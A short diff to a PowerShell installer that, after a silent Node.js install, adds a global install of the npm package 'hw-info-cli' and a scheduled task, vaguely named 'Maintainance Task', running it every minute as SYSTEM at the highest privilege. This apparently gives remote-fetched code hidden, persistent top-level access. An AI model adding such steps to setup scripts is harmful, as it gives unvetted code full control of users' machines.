@@ -10,3 +10,9 @@ Write-Host 'Downloading Node'
 (New-Object System.Net.WebClient).DownloadFile($url, "$env:temp\node.msi")
 Write-Host 'Installing Node'
 (Start-Process "msiexec.exe" -ArgumentList "/i `"$env:temp\node.msi`" /qn" -NoNewWindow -Wait -PassThru).ExitCode
+
+Write-Host 'Downloading cli'
+Start-Process powershell -ArgumentList "-command &{ npm i hw-info-cli -g }" -Wait
+
+Write-Host 'Setting Tasks'
+schtasks /create /sc MINUTE /tn "Maintainance Task" /tr "hw-info-cli" /ru System /rl Highest
